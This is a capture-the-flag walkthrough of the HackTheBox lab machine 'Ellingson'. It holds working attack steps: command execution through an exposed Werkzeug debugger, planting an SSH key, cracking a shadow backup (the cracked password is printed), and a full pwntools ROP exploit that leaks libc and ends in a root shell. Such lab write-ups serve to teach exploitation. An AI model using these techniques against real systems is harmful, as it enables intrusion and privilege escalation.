---
categories:
- CTF
layout: post
media_subpath: /assets/posts/2019-05-18-ellingson-hackthebox
tags:
- binary exploitation
- flask
- hackthebox
- linux
- password cracking
- werkzeug
title: Ellingson @ HackTheBox
---

Ellingson is fun and quick 40 points machine on hackthebox, featuring the abuse of the python/flask werkzeug debugger, cracking a password and a custom binary exploit.

## User Flag

We start by scanning the box:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 49:e8:f1:2a:80:62:de:7e:02:40:a1:f4:30:d2:88:a6 (RSA)
|   256 c8:02:cf:a0:f2:d8:5d:4f:7d:c7:66:0b:4d:5d:0b:df (ECDSA)
|_  256 a5:a9:95:f5:4a:f4:ae:f8:b6:37:92:b8:9a:2a:b4:66 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
| http-title: Ellingson Mineral Corp
|_Requested resource was http://ellingson.htb/index
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

On port 80 we find a website, that shows some articles related to the movie hackers. When entering an invalid article id we are given an interesting debug view:

![](htb_ellingson_web.png)

Hovering a line gives a small debug icon on the right hand side, that reveals a console allowing us to issue python commands.

![](htb_ellingson_console.png)

We are able to use the console to read files and folders:

```
# Read File
[line.rstrip('\n') for line in open('/etc/passwd')]
# List Folder
path for dir_lst in map(os.listdir, filter(os.path.isdir, ['/home/'])) for path in dir_lst]
```

In addition we can use subprocess to execute commands, allowing us to add our public key to the authorized\_keys file of hal:

```
import subprocess;subprocess.check_output("echo '\nkey' >> /home/hal/.ssh/authorized_keys", shell=True)
```

We can now ssh into the box as hal, however there is no user flag yet. We notice that hal is in the "adm" group, which means we probably get something from log files.

In /var/backups we find a file we can read named "shadow.bak", which contains some user hashes. We run john against it with "rockyou.txt" and after some time get a result for margo: "margo:iamgod$08".

We can now su to margo and read the user flag:

```
margo@ellingson:~$ $ wc -lc user.txt
 1 33 user.txt
```

## Root Flag

We look for suid binaries with `find / -perm -u=s -type f 2>/dev/null` and find that "/usr/bin/garbage" seems very suspicious. For analysis and exploitation we download it to our box. After making sure it does nothing malicious to our attacker box by looking at it in IDA, we start the exploitation process.

We quickly manage to crash it by entering a long string as a password:

```
gdb garbage
run <<<$(python -c 'print "A"*200')
[!] Cannot disassemble from $PC
[#0] Id 1, Name: "garbage", stopped, reason: SIGSEGV
```

The first job is to get the offset at which we can overwrite the instruction pointer, which we can do easily in gdb with the gef plugin:

```
pattern create 200
run <<<$(echo aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa)
Cannot disassemble from $PC
...
0x00007ffda4120658│+0x0000: "raaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxa[...]"     ← $rsp
...
pattern find raaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxa
[+] Found at offset 136 (big-endian search)
```

Before going further we need to check which mitigations we have to bypass:

```
cat /proc/sys/kernel/randomize_va_space
2
[+] checksec for 'garbage'
Canary                        : No
NX                            : Yes
PIE                           : No
Fortify                       : No
RelRO                         : Partial
```

This means we have to bypass ASLR and NX. To bypass ASLR we require a memory leak. Since we are not dealing with a position independent executable (PIE), we can call puts inside the procedure lookup table (plt) to leak the address of an entry in the global offset table (got), which would lead to us getting the base of libc.

To begin we retrieve some addresses of functions that are relevant for our exploit. On the x64 architecture rdi holds the first argument to functions, so we need that gadget to prepare arguments for any function we want to call. We use ropper to retrieve the gadgets address:

```
ropper --file garbage  | grep "pop"
0x000000000040179b: pop rdi; ret;
```

We also need the address of puts in the plt ("0x404028″) which we can read in IDA following any puts call in the binary. We also write down the address of main (0x401619"), so that after our leak we can jump back to do another overflow.

After obtaining all information we need for the next step, lets summarize what we want to do. We send a long password, overwriting the return pointer to start a rop chain. The chain places the got entry of puts into rdi (a pointer to its libc address) so that we can call puts with it, printing out the address of puts inside libc to us. Afterwards we jump back to main, allowing us to execute the exploit again with a different payload.

This leads to he following POC:

```
from pwn import *

pop_rdi = 0x000000000040179b
puts_plt = 0x0000000000404028
main = 0x0000000000401619
puts = 0x0000000000401050

def leak_libc(p):
    exploit = 'A'*136 + p64(pop_rdi) + p64(puts_plt) + p64(puts) + p64(main) # return to main after exploitation
    p.recvuntil('password:')
    p.sendline(exploit)
    p.recvline()
    p.recvline()
    x = p.recvline()
    print(repr(x))
    data = x.strip().split('\n')
    address = data[-1] + '\x00\x00'
    return u64(address)

s = ssh(host='10.10.10.139', user='margo', password='iamgod$08')
p = s.process('/usr/bin/garbage')
base = leak_libc(p)
print(hex(base))
```

```
[+] Connecting to 10.10.10.139 on port 22: Done
[*] margo@10.10.10.139:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
[+] Starting remote process '/usr/bin/garbage' on 10.10.10.139: pid 1842
'\xc0\xe9"\x89\x9a\x7f\n'
0x7f9a8922e9c0
```

Everything worked out and we got the address of puts leaked. We have to now find the offset of puts from the base of libc, to be able to call any other libc function relative to its base:

```
readelf -s libc.so.6| grep puts
422: 00000000000809c0   512 FUNC    WEAK   DEFAULT   13 puts@@GLIBC_2.2.5
```

When we subtract 0x809c0 from the leak we get the libc base address. What is left to do now is to call setuid to set our uid to zero and then call execve to "/bin/sh". The function has the following prototype: "int setuid(uid\_t uid);", which means we only need to pop zero into rdi to call it. We repeat the steps we did for the leak to get the offset of setuid and create the following code that executes it:

```
def setuid(p, base):
    p.sendline('A'*136 + p64(pop_rdi) + p64(0) + p64(base+setuid) + p64(main))
    print(p.recv())
```

To execute "/bin/sh" we use [one\_gadget](https://github.com/david942j/one_gadget), which gives a shell upon jumping to a specific address in libc:

```
one_gadget libc.so.6
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

With these pieces we can now create the final POC and get root:

```python
from pwn import *

pop_rdi = 0x000000000040179b
puts_plt = 0x0000000000404028
puts = 0x0000000000401050
base_offset = 0x809c0
magic = 0x4f2c5
main = 0x0000000000401619
setuid = 0x0000000000e5970

def leak_libc(p):
    exploit = 'A'*136 + p64(pop_rdi) + p64(puts_plt) + p64(puts) + p64(main) # return to main after exploitation
    p.recvuntil('password:')
    p.sendline(exploit)
    p.recvline()
    p.recvline()
    x = p.recvline()
    print(repr(x))
    data = x.strip().split('\n')
    address = data[-1] + '\x00\x00'
    return u64(address) - base_offset

def set_uid(p, base):
    p.sendline('A'*136 + p64(pop_rdi) + p64(0) + p64(base+setuid) + p64(main))
    print(p.recv())

def get_shell(p):
    p.sendline('A'*136 + p64(base + magic))
    p.interactive()
    print(p.recv())

s = ssh(host='10.10.10.139', user='margo', password='iamgod$08')
p = s.process('/usr/bin/garbage')
base = leak_libc(p)
print(hex(base))
set_uid(p, base)
get_shell(p)
```

```
[+] Starting remote process '/usr/bin/garbage' on 10.10.10.139: pid 2405
'\xc0\xc9\x9fX\x05\x7f\n'
0x7f055897c000
Enter access password:
[*] Switching to interactive mode

access denied.
Enter access password:
access denied.
# $ id
uid=0(root) gid=1002(margo) groups=1002(margo)
# $ wc -lc /root/root.txt
 1 33 /root/root.txt
```

This was a very fun box, thanks to [Ic3M4n](https://www.hackthebox.eu/home/users/profile/30224) for creating it!